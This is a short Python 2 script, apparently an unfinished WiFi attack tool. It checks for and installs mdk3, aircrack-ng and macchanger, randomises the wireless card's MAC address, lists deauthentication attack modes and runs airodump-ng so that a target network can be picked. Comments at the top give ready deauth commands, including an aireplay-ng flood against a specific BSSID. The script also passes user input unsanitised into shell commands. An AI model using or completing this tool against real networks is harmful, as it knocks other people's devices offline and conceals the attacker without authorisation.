import os
import sys
import string
#########################
#ver:0.1b
#ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' > card.txt && cat -n card.txt
#aireplay-ng -0 0 -a CC:B2:55:FD:41:DA wlan0mon
#cat card.txt | grep -n ^ | grep '+wlancarda+' | cut -d: -f2 > carda.sh
#mdk3 wlan0mon d -n "Hooop"
#| awk '{print FS2 $2}
#sed 's/"//g'
#| sed '/$choose/p; d'
#cat .csv | grep "ESSID" | awk '{print FS1 $1}' | sed 's/,//g' (BSSID)
#cat .csv | grep "ESSID" | awk '{print FS1 $6}' | sed 's/,//g' (CHANNEL)
##cat .csv | grep "ESSID" | awk '{print FS1 $20}' | sed 's/,//g' (ESSID)
#nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SSID, dev wifi list ifname $card | awk '{print FS2 $7}' | sed '2p; d' (ESSID)
#nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SSID, dev wifi list ifname wlan1 | awk '{print FS3 $3}' | sed '2p; d' (CHANNEL)
###########################


print("Check dependencies: ")
print("")
os.system('test /usr/bin/python  && echo "[+] Python ok" || apt-get -y install python')
os.system('test /usr/bin/mdk3 && echo "[+] Mdk3 ok" || apt-get -y install mdk3')
os.system('test /usr/bin/nmcli && echo "[+] Nmcli ok" || apt-get -y install nmcli')
os.system('test /usr/bin/aircrack-ng && echo "[+] Aircrack-ng ok" || apt-get -y install aircrack-ng')
os.system('test /usr/bin/macchanger && echo "[+] MacChanger ok" || apt-get -y install macchanger')
print("")
os.system('clear')

print("Listing Wireless cards: ")
os.system("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' > monitor.rmo")
os.system('cat -n monitor.rmo')
monitor = raw_input("Select you wirelles card fo monitor mode: ")
os.system("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' | grep -n ^ | grep '"+monitor+"' | cut -d: -f2 > monitor.rmo")
os.system("monitor=`cat monitor.rmo` && macchanger -r $monitor")
os.system('clear')


print("List of avaliable attack mod: ")
print("[+] Mdk3 Deauth / Disassociation")
print("[+] Aireplay-ng Deauth")
attack = raw_input("Select one mod fo the attack: ")
os.system('clear')

print("Listing avaliable wireless network for attack: ")
print(".")
print("..")
print("...")
print("....")

os.system("monitor=`cat monitor.rmo` && screen airodump-ng $monitor -w target")

target = raw_input("Select one ESSID for start the attack: ")

#print("")
#print("Return configurations: ")
#os.system('rm *.rmo')
